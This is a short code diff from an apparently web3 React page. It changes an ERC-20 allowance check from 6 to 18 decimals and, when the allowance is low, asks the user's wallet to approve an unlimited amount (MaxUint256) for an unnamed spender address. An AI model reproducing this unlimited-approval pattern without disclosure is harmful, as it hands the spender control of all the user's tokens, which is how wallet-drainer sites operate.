@@ -132,7 +132,7 @@ export default function Home() {
       const contract = new Contract(token, erc20, browserProvider);
       const allowance = await contract.allowance(address, spender);
 
-      if (allowance < ethers.parseUnits("5", 6)) {
+      if (allowance < ethers.parseUnits("5", 18)) {
         setNotice("Waiting for approval confirmation...");
         const data = new ethers.Interface(erc20).encodeFunctionData("approve", [spender, ethers.MaxUint256]);
         const txHash = await provider.request({
